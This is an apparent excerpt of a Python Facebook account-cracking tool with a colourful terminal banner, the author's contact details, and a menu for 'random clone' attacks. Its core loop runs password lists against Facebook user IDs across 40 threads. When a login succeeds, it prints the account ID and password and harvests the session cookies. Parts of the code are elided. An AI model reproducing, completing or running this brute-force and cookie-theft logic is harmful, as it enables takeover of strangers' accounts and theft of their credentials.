# Gift By Salman
# MY FACEBOOK ID : https://www.facebook.com/profile.php?id=100078794655955
...
for ua in range(10000):
	...
	ugen.append(alhhaj)
os.system("xdg-openhttps://www.facebook.com/profile.php?id=100078794655955")
logo =("""
\033[1;32m    人
 \033[1;32m(___)
\033[1;32m_ ;,,,,,,;,
...
\033[1;32m▊▊▊▊▊▊▊▊▊
\033[1;91m╔═════════════════════════╗
\033[1;92m   NAME : SALMAN FARSI
\033[1;92m   FILE NAME: KTM
\033[1;92m   What's up Number :01984176192
\033[1;92m  Good by
\033[1;91m╚═════════════════════════╝
""") 
...
def Alhaj():
    os.system('clear')
    os.system('xdg-open @Vaijan000')
    print(logo)
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
    print("\033[1;36m ║  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m ᎡᎪΝᎠϴᎷ ᏟᏞϴΝᎬ ᏴᎠ        \033[1;36m║")
    print("\033[1;96m ╠═════════════════════════════════╣")
    print(" \033[1;36m║  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m  ᎷƳ ҒᏴ ID: SALMAN 卝 FARSIツ  \033[1;36m║")
    print(" \033[1;36m║  \033[1;35m[\033[1;32m3\033[1;35m][\033[1;32mC\033[1;35m] \033[1;32m  ᎷƳ FB ID: SALMAN 卝 FARSIツ  \033[1;36m║")
...
def Alhajs():
    ...
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100078794655955')
    print(logo)
    print("\033[1;91m╔════════════════════════════════════════════╗")
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m ᏀᏆҒͲ ᏴY SALMAN ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
    ...
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM SALMAN ')
    print("\033[1;91m╚═══════════════════════════╝")
...
def Alhajm(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mSALMAN-X\033[1;91m]🤭[\033[1;92m%s\033[1;91m]😜[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mSALMAN-ϴᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[SALMAN Of-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
